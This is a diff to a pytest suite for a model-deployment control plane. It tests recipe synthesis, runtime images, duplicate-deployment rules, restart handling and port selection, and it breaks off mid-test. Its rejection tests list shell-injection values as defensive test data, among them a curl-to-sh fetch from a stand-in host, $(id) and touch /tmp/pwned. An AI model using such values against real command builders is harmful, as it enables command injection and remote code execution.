@@ -17,6 +17,7 @@ import os
 import shutil
 import subprocess
 import sys
+import json
 import time
 from pathlib import Path
 
@@ -47,8 +48,9 @@ from control_plane.deploy import (  # noqa: E402
     backend_origin,
 )
 from control_plane.deploy import events as ev  # noqa: E402
+from control_plane.deploy import health  # noqa: E402
 from control_plane.deploy import recipes  # noqa: E402
-from control_plane.deploy.flags import KNOBS_BY_NAME  # noqa: E402
+from control_plane.deploy.flags import KNOBS_BY_NAME, RUNTIMES  # noqa: E402
 from control_plane.deploy.fsm import LEGAL, SERVING, TERMINAL  # noqa: E402
 from control_plane.deploy.recipes import materialize, synthesize  # noqa: E402
 from control_plane.deploy.sparkrun import default_served_name, is_oom  # noqa: E402
@@ -111,7 +113,19 @@ class FakeAdapter(SparkrunAdapter):
         self.launches: list[list[str]] = []
         self.stops: list[str] = []
         self.log_tail = ""
+        #: Every log follower this adapter has handed out, so a test can ask
+        #: whether the manager closed them. One left running holds a `docker
+        #: exec` open on the node.
+        self.streams: list["_FakeLogStream"] = []
+        self.launch_output: list[str] = [
+            "Ensuring container image is available locally...",
+            "Ensuring model %s is available locally..." % "the-model",
+        ]
         self.stop_confirms = True
+        #: Seconds `launch` spends before it returns, so a test can spend part
+        #: of the launch budget inside the launcher the way a real image pull
+        #: and weight download do.
+        self.launch_delay = 0.0
         self._counter = 0
         # M-16: cluster ids whose check-job a wedged host cannot answer.
         # is_running() must read this as unknown (None), not as False.
@@ -120,13 +134,35 @@ class FakeAdapter(SparkrunAdapter):
     def available(self) -> bool:
         return True
 
-    def launch(self, plan, shape, runtime, ctx, max_seqs, *, served_name=None, port=None):
+    def launch(
+        self, plan, shape, runtime, ctx, max_seqs, *, served_name=None, port=None,
+        gpu_memory_utilization=None, on_output=None, extra_args=(), custom_command=(),
+    ):
         if self.fail_with is not None:
             raise self.fail_with
+        if self.launch_delay:
+            time.sleep(self.launch_delay)
+        # The real adapter streams sparkrun's output line by line while the
+        # image and the weights arrive. A fake that swallowed it would let the
+        # manager's progress reporting pass a test it does not exercise, so
+        # this says the two things sparkrun says on the way through.
+        for line in self.launch_output:
+            if on_output is not None:
+                on_output(line)
         self._counter += 1
         cluster_id = "sparkrun_%012x" % self._counter
+        # Rendered exactly as the real adapter renders it, including the
+        # per-launch share: a fake that dropped it would let the manager pass
+        # a utilization nothing ever checks.
+        recipe = self.recipe_for(
+            plan, shape, runtime, ctx, max_seqs, served_name=served_name, port=port,
+            gpu_memory_utilization=gpu_memory_utilization, extra_args=extra_args,
+            custom_command=custom_command,
+        )
+        materialize(recipe)
         argv = self.render_command(
-            plan, shape, runtime, ctx, max_seqs, served_name=served_name, port=port
+            plan, shape, runtime, ctx, max_seqs, served_name=served_name, port=port,
+            recipe=recipe, gpu_memory_utilization=gpu_memory_utilization,
         )
         self.launches.append(argv)
         self.running.add(cluster_id)
@@ -160,6 +196,33 @@ class FakeAdapter(SparkrunAdapter):
     def logs(self, cluster_id, *, hosts=None, tail=200, timeout=30.0):
         return self.log_tail
 
+    def stream_logs(self, cluster_id, *, hosts=None, tail=60, on_line=None):
+        """A follower that delivers what `log_tail` holds, then stays open.
+
+        The real one is a `tail -f` inside the container: it keeps running,
+        which is why the manager closes it rather than waiting for it. A fake
+        that reported itself dead would send the manager round its retry loop
+        for no reason, so this one is alive until it is closed.
+        """
+        for line in (self.log_tail or "").splitlines():
+            if on_line is not None and line.strip():
+                on_line(line)
+        return _FakeLogStream(self)
+
+
+class _FakeLogStream:
+    def __init__(self, adapter: "FakeAdapter") -> None:
+        self.adapter = adapter
+        self.closed = False
+        adapter.streams.append(self)
+
+    @property
+    def alive(self) -> bool:
+        return not self.closed
+
+    def close(self) -> None:
+        self.closed = True
+
 
 class FakeProbe:
     """Health probe whose answer is a dict the test controls."""
@@ -169,7 +232,7 @@ class FakeProbe:
         self.overrides: dict[str, bool] = {}
         self.calls = 0
 
-    def __call__(self, backend_url: str, timeout: float = 3.0):
+    def __call__(self, backend_url: str, timeout: float = 3.0, expect_model=None):
         self.calls += 1
         healthy = self.overrides.get(backend_url, self.healthy_by_default)
         return (True, None) if healthy else (False, "%s unreachable" % backend_url)
@@ -181,15 +244,22 @@ class FakeProbe:
 def make_manager(tmp_path, *, registry=None, probe=None, **kwargs) -> DeploymentManager:
     registry = registry or FakeRegistry(fx.SPARK_01, fx.SPARK_02)
     adapter = FakeAdapter(registry, recipe_dir=tmp_path / "recipes")
+    # Every port free unless a test says otherwise. The real check binds, so
+    # left in it would make port assertions depend on what else happens to be
+    # listening on the machine running the suite -- which on the live box is a
+    # coordinator on 8088 and whatever is holding 8100.
+    kwargs.setdefault("port_free_fn", lambda port: True)
+    # setdefault, not fixed: a test about what happens when readiness runs out
+    # has to be able to shorten the wait rather than spend the default on it.
+    kwargs.setdefault("ready_poll_interval_s", 0.01)
+    kwargs.setdefault("ready_timeout_s", 5.0)
+    kwargs.setdefault("stop_confirm_timeout_s", 1.0)
     return DeploymentManager(
         adapter,
         registry,
         state_dir=tmp_path,
         probe_fn=probe or FakeProbe(),
         autostart=False,
-        ready_poll_interval_s=0.01,
-        ready_timeout_s=5.0,
-        stop_confirm_timeout_s=1.0,
         **kwargs,
     )
 
@@ -387,6 +457,105 @@ def test_synthesized_recipe_templates_every_knob_we_override(tmp_path):
     assert "model: openai/gpt-oss-120b" in body
     assert "runtime: vllm" in body
     assert "min_nodes: 2" in body
+
+
+def test_the_tts_recipe_runs_derates_own_server_and_templates_every_knob(tmp_path):
+    """The third runtime, and the only command template that is ours.
+
+    Two separate claims, and the second is the one that bites. `runtime: vllm`
+    in a tts recipe is deliberate -- sparkrun's runtime field selects its
+    orchestration plugin, and every plugin renders an explicit `command:`
+    verbatim, so this borrows the one whose solo path is "run this container
+    with this command" and brings its own command. And because
+    `render_command` emits every knob for every runtime, a key the template
+    does not mention is accepted by sparkrun, exits zero, and never reaches
+    the server.
+    """
+    recipe = synthesize(
+        fx.AUDIO8_TTS_0_6B,
+        fx.single_node_plan(),
+        "tts",
+        2048,
+        1,
+        "audio8-tts",
+        port=8100,
+        gpu_memory_utilization=0.90,
+        recipe_dir=tmp_path,
+    )
+    body = recipe.content
+    assert "python3 -m control_plane.runtimes.tts" in body
+    assert "vllm serve" not in body and "sglang" not in body
+    for key in (
+        "tensor_parallel",
+        "pipeline_parallel",
+        "max_model_len",
+        "max_num_seqs",
+        "port",
+        "served_model_name",
+        "gpu_memory_utilization",
+    ):
+        assert "{%s}" % key in body, "recipe command drops %s" % key
+        assert "\n  %s:" % key in body, "recipe defaults omit %s" % key
+    # The remote code is the model: these checkpoints ship their own
+    # architecture, and without this flag transformers refuses to load them.
+    assert "--trust-remote-code" in body
+    assert "runtime: vllm" in body
+    assert "min_nodes: 1" in body
+
+
+def test_the_vllm_image_is_the_one_that_can_read_an_audio_file():
+    """Not the upstream image, and reverting this to it breaks transcription
+    in a way no gate in this project can see.
+
+    `ghcr.io/spark-arena/dgx-vllm-eugr-nightly` carries no audio decoder at
+    all -- no torchcodec, no soundfile, no PyAV, no system ffmpeg. vLLM serves
+    /v1/audio/transcriptions from it regardless: a Whisper deployment reaches
+    READY, answers the health identity check, is indexed as a transcription
+    target and refuses every upload with "Invalid or unsupported audio file."
+    The resolver said the architecture was supported, the fit gate said it
+    fit, and both were right. docker/audio.Dockerfile is that image plus the
+    two packages, and its build asserts the 44.1 kHz -> 16 kHz resample the
+    upstream one cannot do.
+    """
+    spec = RUNTIMES["vllm"]
+    assert spec.default_image == "ghcr.io/pizzaman213/derate/vllm-audio:latest"
+    assert spec.default_image_env == "DERATE_VLLM_IMAGE"
+    # Still one knob, and it still points anywhere: the operator who wants
+    # exactly the upstream image can have it.
+    upstream = "ghcr.io/spark-arena/dgx-vllm-eugr-nightly:latest"
+    assert recipes.container_image(spec, {"DERATE_VLLM_IMAGE": upstream}) == upstream
+    assert recipes.container_image(spec, {}) == spec.default_image
+
+
+def test_the_audio_dockerfile_builds_on_the_image_it_is_a_layer_over():
+    """Two files name the base and they have to agree, or the audio image is
+    a pip layer over a vLLM nobody is running."""
+    body = (REPO / "docker" / "audio.Dockerfile").read_text()
+    assert "ARG BASE=ghcr.io/spark-arena/dgx-vllm-eugr-nightly:latest" in body
+    # Both packages, because soundfile alone is not enough: it opens the file
+    # and then hands every rate conversion to PyAV, so without PyAV a 16 kHz
+    # clip decodes and a 44.1 kHz one -- which is what this project's own tts
+    # runtime writes -- raises ImportError.
+    assert '"${AV}"' in body and '"${SOUNDFILE}"' in body
+    # The build proves the resample rather than proving the import.
+    assert "load_audio" in body and "44100" in body
+
+
+def test_a_runtime_that_cannot_shard_refuses_the_degrees_before_the_launch():
+    """A single-process runtime handed TP=2 passes the fit gate -- per-rank
+    arithmetic makes a sharded model fit MORE easily -- commits two machines,
+    starts one server, and sits in LAUNCHING until the health timeout. The
+    refusal has to come from the runtime table, which is the only thing that
+    knows."""
+    from control_plane.deploy.flags import sharding_refusal
+
+    assert sharding_refusal("tts", 1, 1) is None
+    for degrees in ((2, 1, 1, 1), (1, 2, 1, 1), (1, 1, 2, 1), (1, 1, 1, 2)):
+        reason = sharding_refusal("tts", *degrees)
+        assert reason and "cannot shard" in reason
+    # And it is a property of the runtime, not of the number: vllm shards.
+    assert sharding_refusal("vllm", 4, 2, 2, 2) is None
+    assert sharding_refusal("sglang", 2, 2) is None
 
 
 def test_synthesized_recipe_is_deterministic(tmp_path):
@@ -630,6 +799,153 @@ def test_path_shaped_command_unsafe_strings_are_still_rejected(tmp_path, model_i
     assert list(tmp_path.glob("*.yaml")) == []
 
 
+@pytest.mark.parametrize(
+    "extra_args",
+    [
+        ("--quantization", "modelopt_fp4"),
+        ("--kv-cache-dtype=fp8",),
+        ("-tp", "2"),
+        ("--trust-remote-code",),
+        ("--lora-modules", "/cache/huggingface/derate-runtime-cache/lora"),
+    ],
+)
+def test_safe_extra_args_reach_the_generated_command(tmp_path, extra_args):
+    """A caller's own runtime flags, once past check_extra_args_safe, land in
+    the recipe's command block -- the whole point of the escape hatch."""
+    recipe = synthesize(
+        fx.GPT_OSS_120B, fx.pp2_plan(), "vllm", 65536, 512, "gpt-oss-120b",
+        port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
+        extra_args=extra_args,
+    )
+    assert " ".join(extra_args) in recipe.content
+    # And recorded in the metadata block, so a recipe that deviates from the
+    # standard template is legible on its own without a diff.
+    assert "derate_extra_args" in recipe.content
+
+
+def test_no_extra_args_means_no_metadata_line_and_no_change_to_the_command(tmp_path):
+    baseline = synthesize(
+        fx.GPT_OSS_120B, fx.pp2_plan(), "vllm", 65536, 512, "gpt-oss-120b",
+        port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
+    )
+    assert "derate_extra_args" not in baseline.content
+
+
+@pytest.mark.parametrize(
+    "token",
+    [
+        "--foo;curl http://evil.example|sh",
+        "--foo$(id)",
+        "--foo`id`",
+        "--foo&&touch /tmp/pwned",
+        "--foo|sh",
+        "with a space",
+        "",
+        "-",
+        "--",
+    ],
+)
+def test_unsafe_extra_args_are_rejected(tmp_path, token):
+    """The third M-22 surface: extra_args land in the same command: | block
+    as model_id and served_name, one per continuation line, and are just as
+    reachable by a shell metacharacter."""
+    with pytest.raises(ValueError, match="extra_args"):
+        synthesize(
+            fx.GPT_OSS_120B, fx.pp2_plan(), "vllm", 65536, 512, "gpt-oss-120b",
+            port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
+            extra_args=(token,),
+        )
+    assert list(tmp_path.glob("*.yaml")) == []
+
+
+# ==========================================================================
+# custom_command: replaces the generated command instead of appending to it.
+# ==========================================================================
+
+
+def test_custom_command_replaces_the_plan_derived_flags(tmp_path):
+    """The operator's own tokens land in the command, and none of the
+    planner's numeric flags -- TP, PP, context, concurrency,
+    gpu_memory_utilization -- reach it at all."""
+    custom_command = ("--tensor-parallel-size", "1", "--gpu-memory-utilization", "0.5")
+    recipe = synthesize(
+        fx.GPT_OSS_120B, fx.pp2_plan(), "vllm", 65536, 512, "gpt-oss-120b",
+        port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
+        custom_command=custom_command,
+    )
+    assert " ".join(custom_command) in recipe.content
+    assert "derate_custom_command" in recipe.content
+    assert "derate_extra_args" not in recipe.content
+    # None of _serve_command's own plan-derived placeholders survive: the
+    # operator's own --tensor-parallel-size above is the only one in the
+    # command, not the generated {max_model_len}/{max_num_seqs} pair.
+    assert "{max_model_len}" not in recipe.content
+    assert "{max_num_seqs}" not in recipe.content
+    assert "--trust-remote-code" not in recipe.content
+
+
+def test_custom_command_still_names_the_resolved_model(tmp_path):
+    """{model} is still the fit gate's own id -- there is no way for operator
+    text to reach it, since the M-22 grammar admits neither `{` nor `}`."""
+    recipe = synthesize(
+        fx.GPT_OSS_120B, fx.pp2_plan(), "vllm", 65536, 512, "gpt-oss-120b",
+        port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
+        custom_command=("--quantization", "modelopt_fp4"),
+    )
+    assert recipe.content.count("{model}") == 1
+    assert "vllm serve" in recipe.content
+
+
+def test_custom_command_pins_host_port_served_name_after_operator_text(tmp_path):
+    """The gateway's routing triple is appended LAST, so it wins over
+    whatever the operator's own text put before it -- every runtime here
+    parses repeated flags last-occurrence-wins, the same way argparse does."""
+    recipe = synthesize(
+        fx.GPT_OSS_120B, fx.pp2_plan(), "vllm", 65536, 512, "gpt-oss-120b",
+        port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
+        custom_command=("--served-model-name", "whatever-i-want"),
+    )
+    command_block = recipe.content.split("command: |\n", 1)[1]
+    assert command_block.index("whatever-i-want") < command_block.index(
+        "--served-model-name {served_model_name}"
+    )
+    assert "--host {host}" in command_block
+    assert "--port {port}" in command_block
+
+
+@pytest.mark.parametrize(
+    "token",
+    [
+        "--foo;curl http://evil.example|sh",
+        "--foo$(id)",
+        "with a space",
+        "",
+    ],
+)
+def test_unsafe_custom_command_tokens_are_rejected(tmp_path, token):
+    with pytest.raises(ValueError, match="custom_command"):
+        synthesize(
+            fx.GPT_OSS_120B, fx.pp2_plan(), "vllm", 65536, 512, "gpt-oss-120b",
+            port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
+            custom_command=(token,),
+        )
+    assert list(tmp_path.glob("*.yaml")) == []
+
+
+def test_extra_args_and_custom_command_together_is_rejected(tmp_path):
+    """The two mean different things -- append versus replace -- and a
+    request cannot mean both, so synthesize refuses rather than picking one
+    silently."""
+    with pytest.raises(ValueError, match="mutually exclusive"):
+        synthesize(
+            fx.GPT_OSS_120B, fx.pp2_plan(), "vllm", 65536, 512, "gpt-oss-120b",
+            port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
+            extra_args=("--quantization", "modelopt_fp4"),
+            custom_command=("--gpu-memory-utilization", "0.5"),
+        )
+    assert list(tmp_path.glob("*.yaml")) == []
+
+
 # ==========================================================================
 # Acceptance: M-22's identifier check gates DeploymentManager.launch()
 # synchronously -- before any record or worker thread exists -- not only
@@ -674,6 +990,62 @@ def test_launch_accepts_a_local_path_model_id(tmp_path):
     local = dataclasses.replace(fx.GPT_OSS_120B, model_id=str(tmp_path / "local-model"))
     deployment = manager.launch(local, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
     assert deployment.state is S.LAUNCHING
+    manager.close()
+
+
+def test_launch_refuses_unsafe_extra_args_before_creating_any_record(tmp_path):
+    manager = make_manager(tmp_path)
+    with pytest.raises(ValueError, match="extra_args"):
+        manager.launch(
+            fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256,
+            extra_args=("--foo;curl http://evil.example|sh",),
+        )
+    assert manager.list() == []
+    manager.close()
+
+
+def test_launch_stores_safe_extra_args_on_the_deployment(tmp_path):
+    manager = make_manager(tmp_path)
+    deployment = manager.launch(
+        fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256,
+        extra_args=("--quantization", "modelopt_fp4"),
+    )
+    assert deployment.state is S.LAUNCHING
+    assert deployment.extra_args == ("--quantization", "modelopt_fp4")
+    manager.close()
+
+
+def test_launch_refuses_unsafe_custom_command_before_creating_any_record(tmp_path):
+    manager = make_manager(tmp_path)
+    with pytest.raises(ValueError, match="custom_command"):
+        manager.launch(
+            fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256,
+            custom_command=("--foo;curl http://evil.example|sh",),
+        )
+    assert manager.list() == []
+    manager.close()
+
+
+def test_launch_refuses_extra_args_and_custom_command_together(tmp_path):
+    manager = make_manager(tmp_path)
+    with pytest.raises(ValueError, match="mutually exclusive"):
+        manager.launch(
+            fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256,
+            extra_args=("--quantization", "modelopt_fp4"),
+            custom_command=("--gpu-memory-utilization", "0.5"),
+        )
+    assert manager.list() == []
+    manager.close()
+
+
+def test_launch_stores_a_safe_custom_command_on_the_deployment(tmp_path):
+    manager = make_manager(tmp_path)
+    deployment = manager.launch(
+        fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256,
+        custom_command=("--gpu-memory-utilization", "0.5"),
+    )
+    assert deployment.state is S.LAUNCHING
+    assert deployment.custom_command == ("--gpu-memory-utilization", "0.5")
     manager.close()
 
 
@@ -872,7 +1244,7 @@ def test_hanging_health_endpoint_still_fails_within_fifteen_seconds(tmp_path):
 
     hanging = {"on": False}
 
-    def probe_fn(backend_url, timeout=3.0):
+    def probe_fn(backend_url, timeout=3.0, expect_model=None):
         if not hanging["on"]:
             return True, None
         # Real socket connect + read against the hanging server above,
@@ -925,16 +1297,22 @@ def test_hanging_health_endpoints_still_fail_within_fifteen_seconds_at_scale(tmp
 
     hanging = {"on": False}
 
-    def probe_fn(backend_url, timeout=3.0):
+    def probe_fn(backend_url, timeout=3.0, expect_model=None):
         if not hanging["on"]:
             return True, None
         return real_probe("http://127.0.0.1:%d/v1" % hang_port, timeout=timeout)
 
     try:
         manager = make_manager(tmp_path, probe=probe_fn)
+        # Eight distinct models, not one model under eight names: a node runs
+        # one copy of a model, and the point here is eight *watched* backends
+        # rather than eight copies of anything.
         deployments = [
             manager.launch(
-                fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256,
+                dataclasses.replace(
+                    fx.GPT_OSS_120B, model_id="openai/gpt-oss-120b-%d" % i
+                ),
+                fx.pp2_plan(), fx.fits(), "vllm", 65536, 256,
                 served_name="model-%d" % i,
             )
             for i in range(8)
@@ -1215,6 +1593,58 @@ def test_thresholds_are_the_documented_ones():
 # ==========================================================================
 
 
+def test_a_launch_with_no_handle_yet_is_unknown_not_dead(tmp_path):
+    """A restart during the first seconds of a launch must not retire it.
+
+    Observed on the live coordinator. A launch was seconds old -- sparkrun
+    spawned, no cluster id recorded yet -- when the control plane was restarted.
+    `_evidence` read the missing cluster id as `False` ("definitely not
+    running") rather than as `None` ("could not ask"), took the FAILED branch,
+    and reported:
+
+        launch did not survive the control plane restart
+
+    while the sparkrun process was alive and still loading its weights. The
+    record was then terminal, so nothing would ever stop it: an orphan holding
+    GPU memory, on a machine whose aggregate memory reads N/A and where only
+    per-process accounting shows it at all.
+
+    `SparkrunAdapter.is_running` is explicitly three-valued about exactly this
+    -- "None is absence of evidence, not evidence of death" -- and the youngest
+    record is the one most likely to still be starting, not the least.
+    """
+    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
+    first = make_manager(tmp_path, registry=registry)
+    deployment = first.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
+    assert wait_for(lambda: first.get(deployment.deployment_id).state is S.READY)
+    first.close()
+
+    # Rewind that record to how it looks in the first seconds of a launch:
+    # LAUNCHING, no backend url, and no cluster id in the handle.
+    # DeploymentStore writes one file per deployment under state_dir/deployments.
+    state_file = tmp_path / "deployments" / ("%s.json" % deployment.deployment_id)
+    body = json.loads(state_file.read_text())
+    body["deployment"]["state"] = "launching"
+    body["deployment"]["backend_url"] = None
+    body.get("handle", {}).pop("cluster_id", None)
+    state_file.write_text(json.dumps(body))
+
+    adapter = FakeAdapter(registry, recipe_dir=tmp_path / "recipes")
+    adapter.running = set()  # sparkrun knows nothing about it -- there is no id to ask about
+    second = DeploymentManager(
+        adapter, registry, state_dir=tmp_path, probe_fn=FakeProbe(healthy_by_default=False),
+        autostart=False,
+    )
+    second.reconcile()
+
+    readopted = second.get(deployment.deployment_id)
+    assert readopted.state is S.LAUNCHING, (
+        "a launch with no handle yet was retired as FAILED; absence of a cluster "
+        "id is absence of evidence, and the process may still be starting"
+    )
+    assert readopted.last_error != "launch did not survive the control plane restart"
+
+
 def test_restart_readopts_a_running_deployment(tmp_path):
     registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
     first = make_manager(tmp_path, registry=registry)
@@ -1363,6 +1793,233 @@ def test_a_relaunch_of_the_same_model_on_the_same_nodes_is_refused(tmp_path):
         manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
     assert excinfo.value.existing.deployment_id == first.deployment_id
     assert len(manager.list()) == 1
+    manager.close()
+
+
+def test_a_second_copy_of_a_model_under_another_name_is_refused(tmp_path):
+    """The rule is one copy per node, not one served name per node.
+
+    A served name is a label the caller may pick; the GPU it would land on is
+    not. Keyed on the name alone this launch went through, and the node ended
+    up loading the same weights twice out of the unified memory the fit gate
+    had budgeted for one of them.
+    """
+    manager = make_manager(tmp_path)
+    first = manager.launch(
+        fx.GPT_OSS_120B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 65536, 256
+    )
+    with pytest.raises(DuplicateDeployment) as excinfo:
+        manager.launch(
+            fx.GPT_OSS_120B,
+            fx.single_node_plan("spark-01"),
+            fx.fits(),
+            "vllm",
+            65536,
+            256,
+            served_name="gpt-oss-120b-second",
+        )
+    assert excinfo.value.existing.deployment_id == first.deployment_id
+    assert excinfo.value.clash == "model"
+    # The refusal renders verbatim, so it has to name the model, the machine,
+    # the deployment in the way, and the way out.
+    message = str(excinfo.value)
+    assert "openai/gpt-oss-120b" in message
+    assert "spark-01" in message
+    assert first.deployment_id in message
+    assert "Stop" in message
+    assert len(manager.list()) == 1
+    manager.close()
+
+
+def test_the_model_rule_is_reported_ahead_of_the_name_rule(tmp_path):
+    """Both rules can fire at once; the wider one is the useful sentence.
+
+    Told to rename, an operator renames -- and is refused again, this time for
+    the reason that was true all along.
+    """
+    manager = make_manager(tmp_path)
+    manager.launch(
+        fx.GPT_OSS_120B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 65536, 256
+    )
+    with pytest.raises(DuplicateDeployment) as excinfo:
+        manager.launch(
+            fx.GPT_OSS_120B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 4096, 8
+        )
+    assert excinfo.value.clash == "model"
+    assert "different name" not in str(excinfo.value)
+    manager.close()
+
+
+def test_the_same_model_on_a_node_that_is_not_running_it_is_allowed(tmp_path):
+    """The rule is per node. A second copy elsewhere is a second machine."""
+    manager = make_manager(tmp_path)
+    first = manager.launch(
+        fx.GPT_OSS_120B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 65536, 256
+    )
+    second = manager.launch(
+        fx.GPT_OSS_120B,
+        fx.single_node_plan("spark-02"),
+        fx.fits(),
+        "vllm",
+        65536,
+        256,
+        served_name="gpt-oss-120b-b",
+    )
+    assert first.deployment_id != second.deployment_id
+    assert len(manager.list()) == 2
+    manager.close()
+
+
+def test_one_served_name_cannot_be_launched_twice_anywhere_in_the_cluster(tmp_path):
+    """The name rule is cluster-wide, not per node.
+
+    Scoped by node it let one served name be launched on two machines: the
+    floor then drew two bands with one caption, /v1 routed to both, and an
+    operator told to stop it had two deployments and no way to tell which one
+    answered. Different model, different machine, same name -- and the model
+    rule cannot be what catches this, which is the point of the fixture.
+    """
+    manager = make_manager(tmp_path)
+    first = manager.launch(
+        fx.GPT_OSS_120B,
+        fx.single_node_plan("spark-01"),
+        fx.fits(),
+        "vllm",
+        65536,
+        256,
+        served_name="house-model",
+    )
+    with pytest.raises(DuplicateDeployment) as excinfo:
+        manager.launch(
+            fx.QWEN3_30B_A3B,
+            fx.single_node_plan("spark-02"),
+            fx.fits(),
+            "vllm",
+            65536,
+            256,
+            served_name="house-model",
+        )
+    assert excinfo.value.clash == "served_name"
+    assert excinfo.value.existing.deployment_id == first.deployment_id
+    # Verbatim, so it has to name the deployment in the way and the way out.
+    message = str(excinfo.value)
+    assert "house-model" in message
+    assert first.deployment_id in message
+    assert "different name" in message
+    assert len(manager.list()) == 1
+    manager.close()
+
+
+def test_a_replica_under_its_own_name_is_still_allowed(tmp_path):
+    """What the widened name rule must NOT cost.
+
+    ``planner.py`` recommends a second replica in as many words -- "run a
+    second replica on spark-02 and let the gateway load balance" -- and this
+    is the launch that takes that advice. It stays legal; it just has to be
+    asked for under its own name.
+    """
+    manager = make_manager(tmp_path)
+    manager.launch(
+        fx.GPT_OSS_120B,
+        fx.single_node_plan("spark-01"),
+        fx.fits(),
+        "vllm",
+        65536,
+        256,
+        served_name="house-model",
+    )
+    manager.launch(
+        fx.GPT_OSS_120B,
+        fx.single_node_plan("spark-02"),
+        fx.fits(),
+        "vllm",
+        65536,
+        256,
+        served_name="house-model-b",
+    )
+    assert len(manager.list()) == 2
+    manager.close()
+
+
+def test_a_name_freed_by_a_failed_deployment_can_be_relaunched(tmp_path):
+    """A cluster-wide rule must not make a name unusable after a failure.
+
+    This is the case that produced the report: three tries at one model, each
+    one refused would have left the name spent for good.
+    """
+    manager = make_manager(tmp_path)
+    first = manager.launch(
+        fx.GPT_OSS_120B,
+        fx.single_node_plan("spark-01"),
+        fx.fits(),
+        "vllm",
+        65536,
+        256,
+        served_name="house-model",
+    )
+    manager._records[first.deployment_id].deployment.state = S.FAILED
+    second = manager.launch(
+        fx.GPT_OSS_120B,
+        fx.single_node_plan("spark-01"),
+        fx.fits(),
+        "vllm",
+        65536,
+        256,
+        served_name="house-model",
+    )
+    assert second.deployment_id != first.deployment_id
+    manager.close()
+
+
+def test_a_plan_overlapping_one_node_of_a_running_deployment_is_refused(tmp_path):
+    """Overlap, not equality. PP=2 over [01, 02] occupies spark-01's GPU too."""
+    manager = make_manager(tmp_path)
+    manager.launch(
+        fx.GPT_OSS_120B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 65536, 256
+    )
+    with pytest.raises(DuplicateDeployment) as excinfo:
+        manager.launch(
+            fx.GPT_OSS_120B,
+            fx.pp2_plan(["spark-01", "spark-02"]),
+            fx.fits(),
+            "vllm",
+            65536,
+            256,
+            served_name="gpt-oss-120b-wide",
+        )
+    assert excinfo.value.clash == "model"
+    manager.close()
+
+
+def test_a_different_model_on_the_same_node_is_untouched_by_the_rule(tmp_path):
+    """Two models sharing a machine is the normal case, and stays legal.
+
+    The fit gate is what decides whether they both fit; this rule must not
+    quietly become a second, cruder memory check.
+    """
+    manager = make_manager(tmp_path)
+    manager.launch(
+        fx.GPT_OSS_120B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 65536, 256
+    )
+    other = manager.launch(
+        fx.LLAMA_3_3_70B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 8192, 16
+    )
+    assert other.shape.model_id == "meta-llama/Llama-3.3-70B-Instruct"
+    assert len(manager.list()) == 2
+    manager.close()
+
+
+def test_a_stopped_deployment_does_not_hold_its_node_against_a_relaunch(tmp_path):
+    """History occupies no GPU. Otherwise a failed launch bricks the node."""
+    manager = make_manager(tmp_path)
+    first = manager.launch(
+        fx.GPT_OSS_120B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 65536, 256
+    )
+    manager._records[first.deployment_id].deployment.state = S.STOPPED
+    again = manager.launch(
+        fx.GPT_OSS_120B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 65536, 256
+    )
+    assert again.deployment_id != first.deployment_id
     manager.close()
 
 
@@ -1596,6 +2253,132 @@ def test_concurrent_deployments_get_distinct_ports(tmp_path):
     manager.close()
 
 
+def test_a_port_something_else_is_listening_on_is_skipped(tmp_path):
+    """The record counter is not the whole truth about a port.
+
+    It knows only what THIS control plane started, so a runtime somebody else
+    left running -- or one of ours orphaned by a restart that forgot it -- was
+    invisible, 8100 got handed out on top of it, and the launch adopted the
+    stranger as its own backend.
+    """
+    manager = make_manager(tmp_path, port_free_fn=lambda port: port not in (8100, 8101))
+    d = manager.launch(
+        fx.GPT_OSS_120B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 8192, 8
+    )
+    assert manager._records[d.deployment_id].handle["port"] == 8102
+    manager.close()
+
+
+def test_a_machine_with_no_free_port_still_gets_one(tmp_path):
+    """The bind check is an improvement on a guess, not a gate.
+
+    Refusing the launch outright would make a machine whose port scan comes
+    back full undeployable, on the strength of a check that cannot see the
+    remote node the plan actually places on. The identity probe is what
+    protects the deployment; this only makes the collision rarer.
+    """
+    manager = make_manager(tmp_path, port_free_fn=lambda port: False)
+    d = manager.launch(
+        fx.GPT_OSS_120B, fx.single_node_plan("spark-01"), fx.fits(), "vllm", 8192, 8
+    )
+    assert manager._records[d.deployment_id].handle["port"] == 8100
+    manager.close()
+
+
+def test_a_backend_serving_another_model_is_not_adopted_as_ours(tmp_path):
+    """The failure this whole check exists for.
+
+    A llama-server left on 8100 answered /v1/models, the readiness wait took
+    the 200 as proof, and `Qwen2.5-0.5B-Instruct` went READY pointing at a
+    process serving `ling-3.0-flash`. Routing then sent it real traffic: a
+    request for one model was answered, with no error anywhere, by another.
+    """
+    def stranger(backend_url, timeout=3.0, expect_model=None):
+        # Liveness alone still says yes, which is exactly the trap: the old
+        # probe asked only this question and got the answer it wanted.
+        if not expect_model:
+            return True, None
+        return False, (
